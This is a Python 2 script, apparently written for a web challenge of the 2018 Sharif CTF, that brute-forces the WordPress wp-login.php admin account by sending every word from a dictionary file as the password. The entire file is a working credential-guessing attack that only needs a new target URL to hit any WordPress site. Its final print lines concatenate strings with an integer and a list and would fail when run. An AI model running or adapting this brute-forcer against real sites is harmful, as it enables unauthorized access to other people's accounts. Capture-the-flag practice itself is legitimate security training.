#!/usr/local/bin/python

####
# AUTHOR: Federico G. De Faveri
# DATE:	Feb 2018
# PURPOSE: This python script will bruteforce a wp-admin login
#          for the web3 challenge of the 2018 ShariCTF competition
####

import requests
import time
import pprint

#define pretty print object
pp = pprint.PrettyPrinter(indent=4)

#define output log file
resultfile = open('results.txt', 'w')

#program intro for user, and get file name from user
print "------------------------------------------------------------"
print "------------------WP-ADMIN-BRUTEFORCER----------------------"
print "------------------------------------------------------------"
print "Please type the name of the password file you want to open"
print "currently available:\n- words.txt [english words dictionary]"
# filename = raw_input("Enter the file name: ") #comment out during development
filename = 'words.txt'

#open file, get passwords and put them into an array
passwords_file = open(filename, 'r')
passwords_raw = passwords_file.readlines()
passwords = []
for passw in passwords_raw:
	passwords.append(passw.rstrip('\n'))

#create base URL to attack
base_attack_url1 = "http://ctf.sharif.edu:8082" + "/wp-login.php"
base_attack_url2 = "http://8082.ctf.certcc.ir/" + "/wp-login.php"

#make cookies
cookies = dict(wordpress_test_cookie='WP Cookie check')

#create a list to catch the succesful attempt
success = []

#bruteforce the wp-login page !!!!!
counter = 0
totalpass = len(passwords)
for pwd in passwords:
	#create the POST data payload
	payload = { 'log':'admin' , 'pwd':pwd , 'wp-submit':'Log In' , 'redirect_to':'http://ctf.sharif.edu:8082/wp-admin/' , 'testcookie':1 }

	#Execute the request
	print("executing request...")
	print("trying password n." + str(counter) + "/" + str(totalpass))
	r = requests.post(base_attack_url2 , data=payload, cookies=cookies)
	counter = counter + 1
	#get the status of response
	status = r.status_code

	#get the headers of the response
	rhead = r.headers

	print("STATUS " + str(status))
	print("HEADER " + str(rhead))

	print("--------")
	# print(r.text)
	print("--------")

	if "is incorrect" in r.text:
		print "######### LOGIN FAILED"
		resultfile.write("attempt n." + str(counter) + "/" + str(totalpass) + "-----FAILED\n")
	else:
		print "########################### LOGIN SUCCESS - pwd: " + pwd
		resultfile.write("########################### LOGIN SUCCESS - password:  " + pwd + "\n")

		success.append(pwd)


print "bruteforcing done, succesful attempts: " + len(success)
print "password found: " + success